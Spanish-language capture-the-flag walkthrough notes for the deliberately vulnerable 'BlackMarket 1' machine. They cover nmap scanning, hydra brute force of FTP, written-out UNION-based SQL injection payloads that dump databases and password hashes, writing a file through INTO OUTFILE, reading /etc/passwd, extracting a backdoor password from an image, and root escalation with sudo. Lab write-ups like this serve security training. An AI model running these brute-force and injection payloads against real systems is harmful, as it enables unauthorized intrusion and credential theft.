# BlackMarket 1

Tags: [[_bruteForce]],[[_sqli]],[[_cracking]],[[_crypto]],[[_webExploitation]],[[_infoLeakage]],[[_sudoersAbusing]]

## Primeros pasos
(Reconocimiento).

Primero le acomodamos bien para que agarre una IP (poner modo Bridged).

Organizamos TMUX.
Hacemos un escaneo en la red para determinar la IP de la máquina.
Mediante el OUI reconocemos la máquina que vamos a atacar.

Le hacemos un ping a la máquina. (Está activa o no).
Posible máquina Linux.
Creamos un directorio como la IP o nombre de la máquina.
Ponemos la IP de la máquina en un lugar visible.
Creamos los directorios de trabajo.

Empezamos el escaneo con NMAP.

Buscamos codename con launchpad, un posible Ubuntu Trusty.

Puertos abiertos.
21 - FTP
Versión 3.0.2

22 - SSH
Versión inferior a la 7.7

80 - HTTP
Mercado de Armas.

110 - POP3

143 - IMAP

993 - SSL (IMAPs)

995 - SSL  (POP3s)


## Investigación (Intrusión)
(Reconocimiento/Enumeración).

21
Ataque de fuerza bruta. (Se contempla que no sabemos si el usuario es válido, y lo hice después de enumerar el HTTP y SSH).
<span style="color:#88c425">hydra -L users.txt -P dictionary.txt ftp://192.168.0.10 -t 20 </span>

Me encuentra credenciales: 
nicky:CIA
Probar en: FTP, SSH, Panel de Autenticación, SquirrelMail.


Enumeramos el FTP.
<span style="color:#88c425">get IMP.txt</span> :    para descargarlo.
Y obtenemos la Flag 2. Y una nota.

22
Probar el User Enumeration por si sirve o está parcheado. (Sí sirve).

Con la credencial que conseguimos del FTP, podemos usarlas, me conecta pero estoy restringido.
Podríamos tratar de colar un comando.
<span style="color:#88c425">sshpass -p 'CIA' ssh nicky@192.168.0.10 whoami</span>
Pero NAI. (A no ser que no vea el output, pero poniéndome en escucha y mandándome un Ping, igual nada (el comando entre comillas simples)).

80
No dice mucho whatweb, trabaja con php. Y es un login.
Fuzzeamos - Varias rutas.
SquirrelMail Versión 1.4.23

El código fuente no dice mucho, solo nos da la primera Flag.
Habla de Operation Treadstone. En una web que siempre sale, hay un staff, los cuales pueden ser nombres de usuarios.

Usuario válido (probado por el ssh):
nicky

Ya que hemos visto que hay data buena en esa web (del Operation Treadston), podríamos montarnos un diccionario con las palabras de dicha web.
Con cewl
<span style="color:#88c425">cewl -w dictionary.txt https://bourne.fandom.com/wiki/Operation_Treadstone</span>
Podríamos ponerle un <span style="color:#ecacb6">-d 0</span> para que no lo haga tan a profundidad.

En el Panel de Autenticación no sirve la credencial.
En el SquirrelMail aparece algo acerca del IMAP, de conexión dropeada (con otras credenciales no sale).


En este punto podríamos, a partir de la nota que conseguimos, ir probando rutas.
Es probar y probar hasta encontrar /vworkshop
Hay múltiples funciones, login, register, etc.
Analizar todo, no olvides el código fuente.

En la parte de "Spare Parts", en la URL se ve un parámetro id que va cambiando dependiendo del artículo.
Al cambiarlo me deja, pero si no existe el artículo, no me pone nada.
Podríamos pensar en fuerza bruta, SQLInjection.

Cuando le agrego comilla no se ve nada, pero si agrego comilla y comento el resto de la query se ve normal.
<span style="color:#ecacb6">1'or sleep(5)-- -</span> :    se tensó, funciona con un "and" porque el producto 1 existe. Es vulnerable.

Podríamos acontecer un error.

Ordenar los datos basándonos en la centésima columna.
<span style="color:#ecacb6">1'order by 100-- -</span> :    ir bajando.
Con 7 se ve, más ya no.
Apliquemos una selección.
<span style="color:#ecacb6">1' union select 1,2,3,4,5,6,7-- -</span> :    para añadir una nueva fila con varios campos, y poniendo los números como valor identificador a través del cual aprovecharnos y obtener los datos que interesan.

Si pongo -<span style="color:#ecacb6">1'</span> y lo demás, <span style="color:#07b4f2">no es válido</span>.
Pero pone valores. Si hago
<span style="color:#ecacb6">-1' union select 1,2,3,database(),5,6,7-- -</span> :    en un campo veo el nombre de la Base de Datos en uso.

Si hago
<span style="color:#ecacb6">-1' union select 1,2,3,group_concat(schema_name),5,6,7 from information_schema.schemata-- -</span>
Veo las bases de datos.

Si hago
<span style="color:#ecacb6">-1' union select 1,2,3,group_concat(table_name),5,6,7 from information_schema.tables where table_schema='eworkshop'-- -</span>

Si hago
<span style="color:#ecacb6">-1' union select 1,2,3,group_concat(column_name),5,6,7 from information_schema.columns where table_schema='eworkshop' and table_name='employee'-- -</span>
Puedo ver las columnas de la tabla employee.

Si hago
<span style="color:#ecacb6">-1' union select 1,2,3,group_concat(lname,0x3a,loginid,0x3a,password,0x3a,emailid),5,6,7 from employee-- -</span>

<span style="color:#07b4f2">Man:admin:IamNoob:admin@admin.com</span>
Puedo ver la data.

Probamos cargar un archivo local de la máquina y sí lo hace.

Podríamos pensar en meter un archivo.
<span style="color:#ecacb6">-1' union select 1,2,3,"test",5,6,7 into outfile "/var/www/html/prueba.txt"</span>
Lo vemos en la web, pero nada.

Con el /etc/passwd confirmamos otros usuarios:
nicky (ya sabíamos).
dimitri
jboourne
No tienen clave privada.

Hacemos lo mismo con las Bases de Datos interesantes.
DB BlackMarket.
Si hago
<span style="color:#ecacb6">-1' union select 1,2,3,group_concat(name,":",information),5,6,7 from BlackMarket.flag-- -</span> :    puedo ver la flag.
Obtenemos la tercera Flag.

Si hago
<span style="color:#ecacb6">-1' union select 1,2,3,group_concat(column_name),5,6,7 from information_schema.columns where table_schema='BlackMarket' and table_name='user'-- -</span>

Si hago
<span style="color:#ecacb6">-1' union select 1,2,3,group_concat(userid,0x3a,username,0x3a,password,0x3a,access),5,6,7 from BlackMarket.user-- -</span> :    veo cositas.
Tiene usuarios y hashes, en md5 por su largo de 32.
Los copiamos y los intentamos romper en hashes.com

De tres usuarios obtuve credenciales.
Las probamos.
En el Panel de Autenticación sí funcionó la de admin, nos deja entrar y nos da la cuarta Flag con otra información, hay que prestarle atención.
Hay una imagen bastante bonita, podríamos pensar en Esteganografía.

Pero antes, enumerar.
Hay un campo editar usuario, subir foto.

En el SquirrelMail pasa lo mismo que con nicky:CIA
Pero con las de jbourne:????? me deja entrar.
Toca enumerar.
Hay un email con la quinta Flag, dice que todo está encriptado.
Y en el From del mail, vemos una ruta pero no parece mucho.

Hay un mensaje cifrado. Podemos usar quipquip en internet. Le pasamos el texto cifrado y nos devuelve el texto bien.
Habla de un backdoor en <span style="color:#ecacb6">/kgbbackdoor/PassPass.jpg</span>
La probamos en /vworkshop y hay una imagen. Podríamos pensar en esteganografía.
Pero antes podríamos fuzzear por algún parámetro.
O fuzzear por archivo php sobre /kgbbackdoor
Hay un /backdoor.php
El cual parece que "manda" un not found, pero hay un campo de entrada pero no hace nada o está protegido con contraseña. La cual puede estar incrustada en la imagen del backdoor, cuidao.

Con strings veo que hay un Pass = 5215565757312090656
Puede estar en decimal, tratemos de convertirlo.
Primero a hexadecimal y luego el proceso inverso para ver si hay algo.

Lo pasamos a hexadecimal y luego a text y nos da "HailKGB".

Lo ocupamos en el backdoor.php y entramos.
Enumerar. Hay campo de una subida de archivo.
Se ve la sexta Flag, que es tiempo de Root.

Ganamos acceso a la máquina.

110

143

993

995

## Escalada

Una vez ganamos acceso al sistema, toca elevar privilegios.

Tratamiento de la TTY.
Y vemos que hay dos interfaces de red pero no se ocupa.

Enumerar todo.
Hay un archivo secreto en /home
Con algo que parece una contraseña, la ponemos bien como el nombre del usuario y sí entro.

Hay cositas en el dir de dimitri pero es lo del mail.
Esto en el grupo sudo, ojito.
<span style="color:#88c425">sudo -l</span> puedo ejecutar lo que quiera como quien quiera.
<span style="color:#88c425">sudo /bin/bash -p</span>
O <span style="color:#88c425">sudo su</span> y pongo la contraseña.

Y pa deeeeentro.

